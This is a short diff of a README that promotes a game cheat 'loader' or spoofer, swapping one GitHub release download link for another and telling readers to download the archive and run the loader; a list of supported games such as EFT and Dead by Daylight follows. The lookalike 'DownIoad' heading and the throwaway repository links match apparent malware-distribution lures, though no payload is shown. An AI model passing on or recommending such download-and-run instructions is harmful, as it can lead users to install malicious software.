@@ -2,11 +2,11 @@
 
 # DownIoad:
 
-## [Click](https://github.com/edudark1000/edudark1000/releases/download/1/Veteran_Loader.zip)
+## [Click](https://github.com/WSADVADSV/spoofer/releases/tag/spoofer)
 
 # Instructions:
 1. Download the archive
-2. Run VeteranLoader
+2. Run Loader
 3. Click continue
 
 
@@ -24,4 +24,4 @@
      🟢 EFT
      🟢 SCUM
      🟢 Dead by Daylight
-     🟢 Enlisted
+     🟢 And softs
